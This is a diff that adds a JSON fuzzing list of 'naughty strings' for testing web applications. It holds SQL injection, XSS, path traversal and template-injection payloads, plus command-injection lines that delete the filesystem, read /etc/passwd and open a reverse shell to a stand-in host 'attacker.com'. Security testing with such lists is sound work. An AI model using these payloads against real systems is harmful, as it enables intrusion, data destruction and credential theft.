@@ -1,0 +1,103 @@
+{
+  "name": "Naughty Strings",
+  "description": "A collection of strings that can cause issues in web applications",
+  "version": "1.0.0",
+  "categories": {
+    "sql_injection": [
+      "' OR '1'='1",
+      "' OR 1=1 --",
+      "'; DROP TABLE users--",
+      "admin'--",
+      "' UNION SELECT NULL--",
+      "1' AND '1'='1",
+      "1' ORDER BY 1--",
+      "' OR 'x'='x"
+    ],
+    "xss": [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>",
+      "javascript:alert('XSS')",
+      "<body onload=alert('XSS')>",
+      "<iframe src='javascript:alert(1)'>",
+      "<marquee onstart=alert('XSS')>",
+      "'\"><script>alert('XSS')</script>",
+      "<IMG SRC=\"javascript:alert('XSS');\">"
+    ],
+    "command_injection": [
+      "; ls -la",
+      "| cat /etc/passwd",
+      "`whoami`",
+      "$(whoami)",
+      "; rm -rf /",
+      "| nc -e /bin/sh attacker.com 4444",
+      "& ping -c 10 127.0.0.1 &"
+    ],
+    "path_traversal": [
+      "../../../etc/passwd",
+      "..\\..\\..\\windows\\system32\\config\\sam",
+      "....//....//....//etc/passwd",
+      "/etc/passwd%00",
+      "..%2F..%2F..%2Fetc%2Fpasswd"
+    ],
+    "special_characters": [
+      "null",
+      "NULL",
+      "nil",
+      "undefined",
+      "NaN",
+      "Infinity",
+      "-Infinity",
+      "true",
+      "false",
+      "0",
+      "-1",
+      "1.0",
+      "0.0",
+      "-0",
+      "1e308",
+      "1e-308"
+    ],
+    "unicode": [
+      "Ω≈ç√∫",
+      "田中さんにあげて下さい",
+      "⁰⁴⁵",
+      "٩(-̮̮̃-̃)۶ ٩(●̮̮̃•̃)۶",
+      "‪‪test‪",
+      "\u0000",
+      "\uFFFF",
+      "🐱",
+      "👨‍👩‍👧‍👦",
+      "🏳️‍🌈"
+    ],
+    "format_strings": [
+      "%s%s%s%s%s",
+      "%d%d%d%d%d",
+      "%n%n%n%n%n",
+      "%x%x%x%x",
+      "{{7*7}}",
+      "${7*7}",
+      "<%= 7*7 %>"
+    ],
+    "overflow": [
+      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "9999999999999999999999999999999999999999999999999999",
+      "-9999999999999999999999999999999999999999999999999999"
+    ],
+    "whitespace": [
+      "",
+      " ",
+      "  ",
+      "\t",
+      "\n",
+      "\r\n",
+      "\u00A0",
+      "\u2003"
+    ]
+  },
+  "notes": [
+    "Use these strings for security testing only",
+    "Always get proper authorization before testing",
+    "Some payloads may be dangerous - use in isolated environments"
+  ]
+}
